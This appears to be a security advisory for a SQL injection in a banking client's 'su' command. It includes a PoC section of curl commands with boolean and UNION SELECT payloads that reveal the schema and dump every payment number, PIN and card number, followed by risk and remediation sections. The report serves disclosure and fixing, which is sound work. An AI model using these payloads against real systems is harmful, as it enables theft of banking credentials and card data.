# Description

SQL injection (CWE-89) in the internal banking client's `su` command. The backend builds a SQLite query by concatenating the `payment_number` argument directly into SQL:

```sql
SELECT id, payment_number, pin, attempts, balance FROM user WHERE payment_number = <input>
```

The command is reachable through the public UUID-namespaced banking client path after opening an API session with the **hard-coded** client token — no web session or bank PIN required. Boolean and `UNION SELECT` payloads execute, and attacker-controlled SQL results are reflected in the JSON response fields.

# Exploitation

| Step | Action | Result |
|------|--------|--------|
| 1 | Open a session with the hard-coded token. | Receive a `sid`. |
| 2 | Call `su` with no argument. | Error discloses the raw query. |
| 3 | Inject via `command+su+payment_number+<payload>`. | Boolean / UNION injection executes. |

# PoC

```bash
TOKEN='[REDACTED]'
BASE='https://<TARGET>/banking/a0faaa38-c51f-428a-bd85-54deb308ac86'
SID=$(curl -sk "$BASE/none&none&$TOKEN" | python3 -c "import json,sys;print(json.load(sys.stdin)['sid'])")
```

**Error-based query disclosure:**

```json
{"success": false, "error": "(sqlite3.OperationalError) incomplete input
[SQL: SELECT id, payment_number, pin, attempts, balance FROM user WHERE payment_number = ]"}
```

**Boolean injection** — `payment_number=1 OR 1=1--` returns the first user record.

**UNION SELECT — arbitrary column control & schema extraction:**

```bash
curl -sk "$BASE/command+su+payment_number+1%20UNION%20SELECT%201,sqlite_version(),3,4,5--&$SID&$TOKEN"
# {"user":{"payment_number":"3.46.1", ...}}

curl -sk "$BASE/command+su+payment_number+1%20UNION%20SELECT%201,group_concat(name),3,4,5%20FROM%20sqlite_master%20WHERE%20type='table'--&$SID&$TOKEN"
# {"user":{"payment_number":"user,card", ...}}
```

**Full dump of payment numbers + PINs and card numbers** (one row, via `group_concat`):

```bash
curl -sk "$BASE/command+su+payment_number+-1%20UNION%20SELECT%201,(SELECT%20group_concat(payment_number||':'||pin,';')%20FROM%20user),3,4,5--&$SID&$TOKEN"
# {"user":{"payment_number":"1111111111111111:999999;2222222222222222:123456;...", ...}}

curl -sk "$BASE/command+su+payment_number+-1%20UNION%20SELECT%201,(SELECT%20group_concat(card_number||':'||user_id,';')%20FROM%20card),3,4,5--&$SID&$TOKEN"
```

Confirmed extraction of all payment numbers, PINs, balances and card numbers. Row counts depend on the instance (15 `user` / 15 `card` rows on the tested instance). Note: the payload cannot contain `/` (it breaks the Django URL route and returns 404), and stacked queries are rejected by `sqlite3` (`You can only execute one statement at a time`).

# Risk

| Dimension | Impact |
|-----------|--------|
| Confidentiality | Full read of the banking database: card numbers, payment numbers, PINs, balances, schema. |
| Integrity | PINs are stored in the same DB and treated as authorization material — this defeats the PIN control. |
| Availability | None — stacked queries are rejected by the `sqlite3` driver, so the injection is limited to a single `SELECT`. |

Overall severity: **High** — no web session or PIN required; an independent path to the entire banking dataset even if helper commands were removed.

# Remediation

1. **Use parameterised queries or safe SQLAlchemy ORM operations** — use SQLAlchemy's `text()` with bound parameters, `bindparam()`, or safe Core/ORM expressions. Never construct SQL statements through string concatenation or interpolation of untrusted input.
2. **Enforce strict input validation** — validate input types, formats and lengths according to the expected data model. Input validation must complement parameterised queries rather than replace them.
3. **Implement secure error handling** — return generic error messages to clients and retain diagnostic information in restricted server-side logs. Ensure that sensitive information is excluded from error responses and logs.
4. **Remove hard-coded credentials** — use a secure server-side secret management mechanism, revoke and rotate exposed credentials, enforce authentication and authorisation, and restrict access according to deployment requirements.
5. **Apply the principle of least privilege** — restrict database access and SQLite database file permissions to the minimum required by the banking service.
6. **Protect sensitive banking data** — minimise sensitive information returned by the API and use appropriate secure storage mechanisms for authentication credentials.
7. **Add regression tests** — verify parameter binding, input validation, secure error handling, access controls and the confidentiality of sensitive data.

# Author
TéléHack
